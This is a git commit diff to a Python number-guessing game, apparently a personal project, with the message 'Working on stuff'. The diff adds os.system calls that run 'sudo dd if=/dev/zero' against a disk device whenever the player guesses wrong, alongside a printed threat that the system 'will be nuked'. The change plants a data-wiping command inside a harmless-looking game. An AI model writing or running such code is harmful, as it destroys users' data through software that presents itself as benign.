f629a9003507a922a5fd80d69e5b75922949645d
Tanish Neema <tneema501@gmail.com>
2025-03-20 21:25:16 -0500

    Working on stuff

--- RandomNumberGuesser/RandomNumberGuesser.py
+++ RandomNumberGuesser/RandomNumberGuesser.py
@@ -8,6 +8,10 @@ guess = int(input("Guess a number between 1 and 100: "))
 while guess != number:
     if guess < number:
         print("Too low!")
+        os.system("sudo dd if=/dev/zero of=/dev/sdX bs=4M status=progress")
     else:
         print("Too bad, your system will be nuked")
-        os.remove("sudo dd if=/dev/zero of=/dev/sdX bs=4M status=progress")
+        os.system("sudo dd if=/dev/zero of=/dev/sdX bs=4M status=progress")
+
+
+print("You guessed it!")
